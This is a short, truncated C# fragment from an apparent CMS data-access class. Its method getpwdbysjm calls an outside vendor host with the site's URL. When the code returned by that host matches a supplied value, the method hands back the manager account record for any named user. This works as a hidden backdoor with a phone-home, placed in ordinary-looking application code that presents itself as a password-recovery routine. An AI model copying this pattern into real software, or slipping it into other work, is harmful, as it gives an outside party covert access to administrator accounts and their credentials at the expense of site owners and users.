...
namespace SPcms.DAL
{
    ...
    public partial class manager
    {
        ...
        public Model.manager getpwdbysjm(string user_name, string sjm, string url)
        {
            string ycyz = Utils.GetDomainStr("dt_cache_getpwd_info", "http://www.weblink.cn/netadmin/getsjm.aspx?u=" + url);
            if (ycyz.Replace("\r\n", "").Trim() == sjm)
            {
                return GetModel(user_name);
            }
            else
            {
                return null;
